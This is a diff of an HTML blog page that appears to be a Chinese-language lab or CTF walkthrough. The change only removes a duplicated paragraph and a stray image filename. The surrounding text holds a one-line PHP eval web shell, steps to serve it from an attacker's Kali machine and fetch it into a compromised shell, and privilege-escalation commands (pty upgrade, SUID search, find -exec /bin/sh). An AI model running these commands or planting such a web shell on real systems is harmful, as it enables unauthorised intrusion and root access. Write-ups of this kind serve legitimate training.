@@ -191,13 +191,12 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_GET[&quot;a&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>kala进入桌面的文件夹下后开启简易的web服务</p>
-<p>kala进入桌面的文件夹下后开启简易的web服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m thhp.server 8081</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220404922.png" alt="image-20240101220404922"></p>
 <p>在拿到的shell中下载该1.php文件</p>
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220417379.png" alt="image-20240101220417379"></p>
-<h2 id="6-提升权限"><a href="#6-提升权限" class="headerlink" title="6,提升权限"></a>6,提升权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -name cron.php -exec &quot;/bin/sh&quot; \; </span><br><span class="line">image-20240101180855301</span><br></pre></td></tr></table></figure>
+<h2 id="6-提升权限"><a href="#6-提升权限" class="headerlink" title="6,提升权限"></a>6,提升权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -name cron.php -exec &quot;/bin/sh&quot; \; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220505786.png" alt="image-20240101220505786"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220511285.png" alt="image-20240101220511285"></p>
